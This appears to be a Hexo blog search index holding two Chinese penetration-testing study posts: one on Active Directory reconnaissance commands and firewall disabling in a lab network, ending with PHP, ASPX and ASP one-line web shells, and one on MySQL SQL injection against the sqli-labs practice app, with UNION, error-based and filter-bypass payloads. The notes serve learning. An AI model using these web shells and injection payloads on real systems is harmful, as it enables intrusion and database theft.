<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>渗透实战学习</title>
    <url>/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<hr>
<p>光看书不动手是无法更深刻理解的，一开始还是跟着大佬的步骤走，再自己复现一遍，尽可能搞懂每一步！</p>
<h2 id="1-内网基础知识"><a href="#1-内网基础知识" class="headerlink" title="1.内网基础知识"></a>1.内网基础知识</h2><p><strong>工作组：</strong>在工作组中的网络可以互相访问对方的共享资源，主要按部门或者功能进行分组</p>
<p><strong>域（Domain）：</strong>是一个有安全边界的计算机集合，可以理解为升级版的工作组，但域的安全管理控制机制更加严格。用户必须以合法的身份登录域，且用户的权限是根据用户在域中的身份决定的。</p>
<p><strong>域控制器（DC）：</strong>可以理解为一个单位的门禁系统，负责所有连入的计算机和用户的验证工作</p>
<p>域控制器存在这个域所有账户、密码等信息的数据库</p>
<p>域中一般有以下几个环境：</p>
<p><strong>单域：</strong>在一个地理位置固定的小公司，建立一个域就可以了。一般一个域至少两台域服务器，一个作为DC，另一台作为备份DC。</p>
<p>父域和子域：第一个创建的域为父域，各分部的域称为该域的子域。例如一个大公司的各个分公司位于不同的地点，就需要用到父域和子域。因为在同一个域当中，信息交互是比较多的，而且不能压缩。而不同域信息交互比较少，而且可以压缩。同时也为了安全考虑，每个域都有自己的安全策略，比如财务部希望使用特定的安全策略（包括账号密码策略）</p>
<p><strong>域树：</strong>是多个域通过建立信任关系组成的集合</p>
<p>（父）abc.com —-asia.abc.com ——cn.asia.abc.com（子）</p>
<p>abc.com—–europe.abc.com—–ft.asia.abc.com</p>
<p>子域只能使用父域的名字作为其域名的后缀</p>
<p><strong>域森林：</strong>多个域树建立信任关系组成的集合</p>
<p>比如abc.com要合并abc.net，但无法挂下，所以需要建立信任关系来构成</p>
<p><strong>域名服务器（Domain Name Server，DNS）：</strong>是指用于实现域名和与之相对应的IP地址转换的服务器</p>
<p>域树的域名和DNS域名非常相似，实际上，因为域中的计算机是使用DNS来定位域控制器、服务器以及其他计算机、网络服务的，所以域的名字就是DNS域的名字。</p>
<p><strong>在内网渗透中，大部分是通过寻找DNS服务器来确定域控制器的位置（这两者通常配值在一台机子上）</strong></p>
<p><strong>活动目录：</strong>是指域环境中提供目录服务的组件</p>
<p>域服务器和活动目录的区别：</p>
<p><strong>安全域的划分：</strong>划分安全域的目的是将安全等级相同的计算机划入同一网段，该网段的计算机拥有相同的网络边界，并在网络边界部署防火墙实现对其它安全域的网络访问控制策略。</p>
<p><strong>安全域一般分为DMZ和内网</strong></p>
<p>在一个用路由器连接的内网中，分为安全级别最高的内网、中等的DMZ、最低的外网。三个区域任务不同，访问策略不同</p>
<p><strong>DMZ称为隔离区</strong>，位于企业内部网络和外部网络之间。可以在其中放一些必须空开的服务器，如FTP、Web、论坛服务器</p>
<p>在网络边界上一般会部署防火墙及入侵检测等，如果有Web应用还会设置WAF，从而有效保护内网。</p>
<p>在配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略，以实现屏障功能：</p>
<p><strong>1.内网可以访问外网：</strong>在这一策略中，防火墙需要执行NAT</p>
<p><strong>2.内网可以访问DMZ：</strong>内网用户可以管理DMZ中的服务器</p>
<p><strong>3.外网不能访问内网：</strong>如果要访问，要通过VPN</p>
<p><strong>4.外网可以访问DMZ：</strong>需要由防火墙来完成从对外地址到服务器实际地址的转换</p>
<p><strong>5.DMZ不能访问内网、不能访问外网：</strong>保护内网</p>
<p><strong>内网又可以划分为办公区和核心区：</strong></p>
<p>办公区：公司员工日常的工作区，攻击者如果想进入内网，一般会使用<strong>鱼叉攻击、水坑攻击</strong>、社工等</p>
<p>核心区：存储企业最重要的数据等信息资产，通过日志记录、安全审计等安全措施进行严密的保护</p>
<p>一般来讲，能直接访问的只有运维人员或者IT部门的主管，所以攻击者会重点关注这些用户的信息</p>
<p><strong>（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</strong></p>
<p><strong>桥接模式：</strong>在桥接网络中，虚拟机是独立的机器。虚拟机和主机就好比插在同一台交换机上的两台计算机。如果主机连接到开启了DHCP服务的(无线)路由器上，虚拟机就可以自动获取IP地址，反之需要手动配值。只要IP地址在同一网段内，局域网内所有同网段的计算机就能够互访，这样虚拟机就可以上网了。</p>
<p><strong>NAT模式(Network Address Translator):</strong>表示网络地址转换，虚拟机通过与物理机的连接来访问网络。虚拟机能够访问主机所在局域网内所有同网段的计算机，但是除了主机，局域网内的其它计算机都无法访问虚拟机。</p>
<p><strong>Host-only模式:</strong>虚拟机处于一个独立的网段中，此模式下的虚拟机是无法上网的，但是可以通过windows提供的连接共享功能实现共享上网，主机能与所有虚拟机互访。如果没用开启windows的连接共享功能，除了主机，虚拟机与主机所在局域网内的所有其他计算机之间都无法访问。</p>
<hr>
<p>kail ip:192.168.126.1</p>
<p>win7 ip:192.168.52.143  /   外网：192.168.126.128</p>
<p>winK3 ip:192.168.52.141</p>
<p>win2008: 密码改为hongri@2019  ip:192.168.52.138</p>
<p>netstat -an 查看被打开的端口列表</p>
<p>netstat -ano | findstr “80” 查看某个具体端口的占用情况</p>
<p>tasklist | findstr “680”  查看具体哪个应用被占用了</p>
<h2 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a><strong>2.内网信息收集</strong></h2><h3 id="2-1-收集本机信息"><a href="#2-1-收集本机信息" class="headerlink" title="2.1 收集本机信息"></a><strong>2.1 收集本机信息</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all 　　　　　  <span class="comment">#查询本机IP段，所在域等 </span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">" OS 版本"</span> <span class="comment">#查询操作系统版本</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">" OS VERSION"</span> <span class="comment">#英文版</span></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% <span class="comment">#查看系统体系结构  ---x86 、 amd64</span></span><br><span class="line">wmic service list brief <span class="comment">#查询本机服务信息</span></span><br><span class="line">tasklist | findstr <span class="string">"680"</span>  <span class="comment">#查看具体哪个应用被占用了,tasklist查看当前进程</span></span><br><span class="line">wmic <span class="keyword">process</span> list brief <span class="comment">#查看进程信息</span></span><br><span class="line">wmic startup get command,caption <span class="comment">#查看启动程序信息</span></span><br><span class="line">schtasks /query /fo LIST /v <span class="comment">#查看计划任务</span></span><br><span class="line">net statistics workstation <span class="comment">#查看主机开机时间</span></span><br><span class="line">net user 　　　　　　　   <span class="comment">#本机用户列表 ---可以分析内网机器的命名规则</span></span><br><span class="line">net localgroup administrators          <span class="comment">#本机管理员[通常含有域用户]</span></span><br><span class="line">query user || qwinsta  <span class="comment">#查看当前在线用户</span></span><br><span class="line">net session <span class="comment">#列出或断开本地计算机与所连接的客户端之间的会话</span></span><br><span class="line">netstat <span class="literal">-ano</span> <span class="comment">#查看所有占用端口的列表</span></span><br><span class="line">systeminfo <span class="comment">#查看系统的详细信息，需要注意系统的版本、补丁信息等</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,Installedon <span class="comment">#查看安装在系统中的补丁</span></span><br><span class="line">net share <span class="comment">#查询本机共享列表和可访问的域共享列表</span></span><br><span class="line">route print</span><br><span class="line">arp <span class="literal">-a</span>  <span class="comment">#查询路由表以及所有可用接口的ARP缓存表</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">###查询防火墙相关配值###</span></span><br><span class="line">netsh firewall set opmode disable <span class="comment">#关闭防火墙 win2003及之前的版本</span></span><br><span class="line">netsh advfirewall set allprofiles state off <span class="comment">#之后的版本</span></span><br><span class="line">netsh firewall show config <span class="comment">#查看防火墙的配值</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2查询当前权限"><a href="#2-2查询当前权限" class="headerlink" title="2.2查询当前权限"></a><strong>2.2查询当前权限</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami <span class="comment">#查看当前权限</span></span><br><span class="line">whoami /all <span class="comment">#获取域SID</span></span><br><span class="line">net user 用户名 /domain   <span class="comment">#获取指定用户的账户信息</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3判断是否存在域"><a href="#2-3判断是否存在域" class="headerlink" title="2.3判断是否存在域"></a><strong>2.3判断是否存在域</strong></h3><p>获得了本机的相关信息后，就要判断当前内网中是否存在域。<strong>如果当前内网中存在域，就需要判断所控主机是否在域内</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看本机是否和DNS服务器处于同一网段</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; ipconfig /all</span><br><span class="line">Windows IP 配置</span><br><span class="line">   主机名  . . . . . . . . . . . . . : stu1</span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : god.org</span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line">   DNS 后缀搜索列表  . . . . . . . . : god.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断域控制服务器是否和DNS服务器在同一台服务器上</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; nslookup god.org</span><br><span class="line">非权威应答:</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">126.2</span></span><br><span class="line">名称:    god.org</span><br><span class="line">Addresses:  <span class="number">23.253</span>.<span class="number">58.227</span></span><br><span class="line">      <span class="number">176.34</span>.<span class="number">241.253</span></span><br><span class="line">      <span class="number">162.242</span>.<span class="number">150.89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域名、登录服务器为域控制器   如果域为WORKGROUP 表示当前服务器不在域内</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; systeminfo</span><br><span class="line">虚拟内存: 可用:   <span class="number">2</span>,<span class="number">765</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">1</span>,<span class="number">330</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line"></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询当前登录域及登录用户信息</span></span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net config Workstation</span><br><span class="line">计算机名                     \\STU1</span><br><span class="line">计算机全名                   stu1.god.org</span><br><span class="line">用户名                       Administrator</span><br><span class="line">工作站域                     GOD</span><br><span class="line">工作站域 DNS 名称            god.org  <span class="comment">###当前登录域名</span></span><br><span class="line">登录域                       GOD   <span class="comment">#此处表示当前用户是域用户还是本地，，这里表示域用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断主域</span></span><br><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">通常有三种情况：</span><br><span class="line">存在域，但当前用户不是域用户----拒绝访问</span><br><span class="line">存在域，且是--<span class="literal">-xx</span>的当前时间是xxx</span><br><span class="line">当前网络环境是工作组----找不到域xx的域控制器</span><br></pre></td></tr></table></figure>

<h3 id="2-4探测域内存活主机"><a href="#2-4探测域内存活主机" class="headerlink" title="2.4探测域内存活主机"></a><strong>2.4探测域内存活主机</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>



<p>一句话木马：</p>
<p>php一句话木马：<br>　　 <?php @eval($_POST[value]);?><br>　　<br>aspx一句话木马：<br>　　&lt;%@ Page Language=“Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>　　<br>asp一句话木马：<br>　　 &lt;%execute(request(“v”))%&gt;</p>
]]></content>
      <categories>
        <category>渗透之路</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL_SQL_BYPASS</title>
    <url>/2020/04/22/MYSQL-SQL-BYPASS/</url>
    <content><![CDATA[<p>知其然，更要知其所以然！ </p>
<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
<p>我们经常用到的几个表</p>
<ol>
<li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
<li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
<li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
</ol>
<p>SCHEMATA: </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>

<p>TABLES:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>COLUMNS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>user 表保存的用户密码 和host等等信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>

<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>

<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
<li><strong>过滤不严格。</strong></li>
<li><strong>数据库配置不当。</strong></li>
<li><strong>转义不当。</strong></li>
</ol>
<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
<ol>
<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
</ol>
<hr>
<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
<p>读取host与user</p>
<p>通过以上信息还能大概判断下是不是站库分离之类的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
<p>同时#被过滤，但 –+ 可以</p>
<p>order by 猜测 列数  —-爆出为3列</p>
<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>可以爆出所有表–emails,referers,uagents,users</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>

<p>可以爆出user表下的所有列—id,username,password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>

<p>爆字段—</p>
<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
<p>总结：group_concat()可以聚合起来，查看更方便</p>
<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>

<p>users表被拦截，可以用以下方法绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>Q1.floor()函数是什么？</p>
<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
<p>Q2.rand(0)是什么意思？</p>
<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>Q3.为什么会出现报错？</p>
<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>

<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>

<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
